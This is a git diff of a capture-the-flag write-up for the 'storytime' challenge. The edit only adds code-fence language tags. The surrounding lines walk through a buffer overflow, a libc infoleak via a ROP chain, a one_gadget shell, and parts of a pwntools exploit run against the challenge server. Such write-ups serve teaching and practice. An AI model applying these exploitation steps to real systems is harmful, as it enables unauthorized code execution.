@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file storytime
 storytime: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=3f716e7aa7e236824c52ed0410c1f14739919822, not stripped
 $    pwn checksec storytime
@@ -20,7 +20,7 @@ Tell me a story:
 
 So we are dealing with a `64` bit dynamically linked binary that has a non-executable stack. When we run it, it prompts us for input. Let's look at the main function in Ghidra:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -40,7 +40,7 @@ Looking under the imports in Ghidra, we can see that our imported functions are 
 
 The issue with this is we don't know what version of libc is running on a server. For this I looked at what libc version they gave out for other challenges and guessed and checked. After a bit I found that it was libc version `libc.so.6`. However before I did that I got it working locally with my own libc. To see what libc file your binary is loaded with, and where the file is stored, you can just run the `vmmap` command in gdb while the binary is running:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /Hackery/hs/storytime/storytime
@@ -66,7 +66,7 @@ Also the indication I used to see if I had the right libc version (doesn't work 
 
 Now back to the exploitation. There are `0x38` bytes between the start of our input and the return address (`48` for the size of the char buffer, and `8` for the saved base pointer). Now for the write libc infoleak we will need the `rdi` register to have the value `0x1` to specify the stdout file handle, `rsi` to have the address of the got entry for write (since that will give us the libc address for write), and `rdx` to have a value greater than or equal to `8` (to leak the address). Also since PIE isn't enabled, we know the address of the got entry without a PIE infoleak. Looking at the assembly code leading up to the `ret` instruction which gives us code execution, we can see that the `rdx` register is set to `0x190` which will fit our needs.
 
-```
+```c
         00400684 ba 90 01        MOV        EDX,0x190
                  00 00
         00400689 48 89 c6        MOV        RSI,RAX
@@ -82,13 +82,13 @@ Now back to the exploitation. There are `0x38` bytes between the start of our in
 
 Now for the got entry of `write` in the `rsi` register, we see that there is a rop gadget that will allow us to pop it into the register. It will also pop a value into the `r15` register, however we just need to include another 8 byte qword in our rop chain for that so it really doesn't affect much:
 
-```
+```console
 $    python ROPgadget.py --binary storytime | grep rsi
 0x0000000000400701 : pop rsi ; pop r15 ; ret
 ```
 
 For the last register (the `1` in `rdi`) I settled this with where we jumped back to. Instead of calling `write`, I just jumped to `0x400601` which is in the middle of the `end` function:
-```
+```c
 
 void end(void)
 
@@ -99,7 +99,7 @@ void end(void)
 ```
 
 Specifically the instruction we jump back to will mov `0x1` into the `edi` register then call `write`, which will give us our infoleak:
-```
+```c
         00400606 e8 95 fe        CALL       write                                            ssize_t write(int __fd, void * _
                  ff ff
         0040060b 90              NOP
@@ -109,7 +109,7 @@ Specifically the instruction we jump back to will mov `0x1` into the `edi` regis
 
 Then it will return and continue on with our rop chain. However before it does that, it will pop a value off of our chain into the `rbp` register so we will need to include a filler 8 byte qword in our rop chain at that point. For where to jump to, I choose `0x40060e`, since it is the beginning of the `climax` function which gives us a buffer overflow where we can overwrite the return address with a onegadget and pop a shell.
 
-```
+```c
 void climax(void)
 
 {
@@ -122,7 +122,7 @@ void climax(void)
 
 Also to find the onegadget, we can just use the onegadget finder like this to find the offset from the base of libc. To choose which one to use, I normally just guess and check instead of checking the conditions at runtime (I find it a bit faster):
 
-```
+```console
 $    one_gadget libc.so.6
 0x45216 execve("/bin/sh", rsp+0x30, environ)
 constraints:
@@ -143,7 +143,7 @@ constraints:
 
 Putting it all together, we get the following exploit. If you want to run it locally with a different version of libc, you can either swap it out with something like `LD_PRELOAD`, or just switch the `libc` variable to point to the libc version you're using. If you do do that, you will also need to update the one_gadget offset too:
 
-```
+```python
 from pwn import *
 
 # Establisht the target
@@ -202,7 +202,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $    python exploit.py
 [+] Opening connection to pwn.hsctf.com on port 3333: Done
 [*] '/Hackery/hs/storytime/libc.so.6'
